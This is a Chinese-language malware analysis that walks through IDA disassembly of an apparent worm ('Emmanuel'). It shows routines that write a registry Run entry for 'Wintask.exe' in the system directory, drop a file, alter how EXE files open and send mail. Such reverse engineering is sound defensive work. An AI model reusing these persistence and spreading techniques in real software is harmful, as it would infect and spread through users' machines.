
# DialogFunc 函数分析

## 反汇编代码

```
pec1:00401B19              jz      short loc_401B83
pec1:00401B19
pec1:00401B1B              dec     eax
pec1:00401B1C              jnz     short loc_401B50
pec1:00401B1C
pec1:00401B1E              mov     eax, [esp+arg_8]
pec1:00401B22              cmp     eax, 3E8h
pec1:00401B27              jnz     short loc_401B55
pec1:00401B27
pec1:00401B29              push    1010h           ; uType
pec1:00401B2E              push    offset Caption  ; "Emmanuel....."
pec1:00401B33              push    offset s_Emmanuel-godI ; "Emmanuel-God is with us!May god bless u"...
pec1:00401B38              push    0               ; hWnd
pec1:00401B3A              call    MessageBoxA     ; 显示一个 Emmanuel-God is with us!May god bless u 的消息框
pec1:00401B40              push    3E8h            ; nResult
pec1:00401B45              mov     eax, [esp+4+hDlg]
pec1:00401B49              push    eax             ; hDlg
pec1:00401B4A              call    EndDialog
pec1:00401B4A
pec1:00401B50
pec1:00401B50 loc_401B50: ; CODE XREF:
                          ;
                          ; DialogFunc+Cj
pec1:00401B50              ;
pec1:00401B50              ;
pec1:00401B50              ; DialogFunc+48j
pec1:00401B50              xor     eax, eax
pec1:00401B52              retn    10h
pec1:00401B52
pec1:00401B55 ;
pec1:00401B55 ; ---------------------------------------------------------------------------
pec1:00401B55
pec1:00401B55 loc_401B55: ; CODE XREF:
                          ;
                          ; DialogFunc+17j
pec1:00401B55              cmp     eax, 2
pec1:00401B58              jnz     short loc_401B50
pec1:00401B58
pec1:00401B5A              push    0               ; uType
pec1:00401B5C              push    offset Caption  ; "Emmanuel....."
pec1:00401B61              push    offset s_MayGodBlessUD ; "May GOd bless u;D"
pec1:00401B66              push    0               ; hWnd
pec1:00401B68              call    MessageBoxA     ; 显示 May GOd bless u;D
pec1:00401B6E              push    2               ; nResult
pec1:00401B70              mov     ecx, [esp+4+hDlg]
pec1:00401B74              push    ecx             ; hDlg
pec1:00401B75              call    EndDialog
pec1:00401B7B              push    0               ; uExitCode
pec1:00401B7D              call    ExitProcess
pec1:00401B7D
pec1:00401B83
pec1:00401B83 loc_401B83: ; CODE XREF:
                          ;
                          ; DialogFunc+9j
pec1:00401B83              mov     eax, 1
pec1:00401B88              retn    10h
pec1:00401B88
pec1:00401B88 DialogFunc    endp
```

从上面可以看出该函数主要是显示一个消息框，至于显示哪一个则是根据 `LPARAM` 来进行判断。也即上面的模态窗口的处理函数主要是为了显示一个消息：`Emmanuel-God is with us!May god bless u` 或 `May GOd bless u`。

## CreatWindow 函数

至此窗口类的注册部分我们算是基本完毕了。现在进入创建窗口部分。重新返回 `WINMAIN`

```
pec1:00401693              call    CreatWindow    ; 在双击
```

```
pec1:004017B0 ; int __cdecl CreatWindow(HINSTANCE hInstance)
pec1:004017B0 CreatWindow   proc near           ; CODE XREF:
                          ;
                          ; WinMain(x,x,x,x)+33p
pec1:004017B0
pec1:004017B0 hInstance     = dword ptr  4
pec1:004017B0
pec1:004017B0              mov     eax, [esp+hInstance]
pec1:004017B4              push    0               ; lpParam
pec1:004017B6              push    eax             ; hInstance
pec1:004017B7              push    0               ; hMenu
pec1:004017B9              push    0               ; hWndParent
pec1:004017BB              push    0               ; nHeight
pec1:004017BD              push    80000000h       ; nWidth
pec1:004017C2              push    0               ; Y
pec1:004017C4              push    80000000h       ; X
pec1:004017C9              push    0CF0000h        ; dwStyle
pec1:004017CE              push    offset WindowName ; lpWindowName
pec1:004017D3              push    offset ClassName ; lpClassName
pec1:004017D8              push    0               ; dwExStyle
pec1:004017DA              mov     hInstance, eax
pec1:004017DF              call    CreateWindowExA   ; 创建窗口
pec1:004017E5              test    eax, eax
pec1:004017E7              jnz     short loc_4017EA
pec1:004017E7
pec1:004017E9              retn
pec1:004017E9
pec1:004017EA ; -----------------------------------------------------
pec1:004017EA
pec1:004017EA loc_4017EA: ; CODE XREF:
                          ;
                          ; CreatWindow+37j
pec1:004017EA              push    eax             ; hWnd
pec1:004017EB              mov     dword_4066F8, eax
pec1:004017F0              call    UpdateWindow
pec1:004017F6              call    RegSetRun       ; 进行注册表操作
pec1:004017F6
pec1:004017FB              call    CopyFile        ; 释放文件
pec1:004017FB
pec1:00401800              call    ModExeMod       ; 修改ＥＸＥ文件的打开方式
pec1:00401800
pec1:00401805              call    Mail            ; 发送邮件
pec1:00401805
pec1:0040180A              mov     eax, hInstance
pec1:0040180F              push    83h             ; lpIconName
pec1:00401814              push    eax             ; hInstance
pec1:00401815              call    LoadIconA
pec1:0040181B              mov     ecx, dword_4066F8
pec1:00401821              push    offset s_ComeOnLetsPar ; "Come on lets party!!!"
pec1:00401826              push    eax
pec1:00401827              push    83h
pec1:0040182C              push    ecx
pec1:0040182D              call    tasknotify      ; 在任务栏添加一个小图标，把鼠标放上去时显示 Come on lets party!!!
pec1:0040182D
pec1:00401832              add     esp, 10h
pec1:00401835              mov     eax, 1
pec1:0040183A              retn
pec1:0040183A
pec1:0040183A CreatWindow   endp
pec1:0040183A
```

上面的注释已经很清楚，这里我就不总结了，现在进入注册表的操作部分，看看它都对注册表进行了哪些操作：

## RegSetRun 函数

```
RegSetRun       proc near           ; CODE XREF: CreatWindow+46p
pec1:00401590
pec1:00401590 hKey            = dword ptr -4
pec1:00401590
pec1:00401590              push    ecx
pec1:00401591              push    esi
pec1:00401592              lea     eax, [esp+8+hKey]
pec1:00401596              push    0               ;
                          ;
                          ; lpdwDisposition
pec1:00401598              push    eax             ; phkResult
pec1:00401599              push    0               ;
                          ;
                          ; lpSecurityAttributes
pec1:0040159B              push    20006h          ; samDesired
pec1:004015A0              push    0               ; dwOptions
pec1:004015A2              push    0               ; lpClass
pec1:004015A4              push    0               ; Reserved
pec1:004015A6              push    offset s_SoftwareMic_0 ;
                          ;
                          ; "SOFTWARE\\Microsoft\\Windows\\CurrentVersi"...
pec1:004015AB              push    80000002h       ; hKey
pec1:004015B0              call    RegCreateKeyExA
pec1:004015B6              push    104h
pec1:004015BB              call    operator new(uint)
pec1:004015BB
pec1:004015C0              add     esp, 4
pec1:004015C3              mov     esi, eax
pec1:004015C5              push    104h            ; uSize
pec1:004015CA              push    esi             ; lpBuffer
pec1:004015CB              call    GetSystemDirectoryA
pec1:004015D1              push    offset s_Wintask_exe ;
                          ;
                          ; "\\Wintask.exe"
```
